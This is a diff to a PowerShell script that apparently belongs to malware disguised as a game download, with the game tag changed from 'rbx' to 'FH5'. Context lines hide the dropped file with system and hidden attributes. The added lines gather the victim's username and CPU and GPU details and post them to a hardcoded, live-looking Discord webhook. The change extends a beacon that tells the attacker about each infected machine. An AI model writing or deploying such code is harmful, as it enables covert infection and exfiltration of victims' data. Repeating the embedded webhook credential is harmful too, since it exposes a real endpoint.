@@ -27,12 +27,26 @@ $ieoaj = $destination
 sleep 10
 attrib +s +h $ieoaj
 
+# Retrieve CPU information
+$cpu = Get-WmiObject -Class Win32_Processor | Select-Object -Property Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors
+
+# Retrieve GPU information
+$gpu = Get-WmiObject -Class Win32_VideoController | Select-Object -Property Name, AdapterRAM, DriverVersion
+
+sleep 2
+
 # Define the Discord webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1267096144723316767/cxOE9Wv5o7qnXO7hMb18y9TP0n6uSNmFIF1mv3MnTV-JxOhWTXcnXgypXbmYD2saDBJm"
 
 # Define the message payload
 $payload = @{
-    content = "**$env:username** has joined - rbx"
+    content = @"
+**$env:username** has joined - FH5
+----------------------------------
+**GPU:** $($gpu.Name)
+**CPU:** $($cpu.Name)
+**CPU Cores:** $($cpu.NumberOfCores)
+"@
 } | ConvertTo-Json
 
 # Send the POST request to the webhook URL
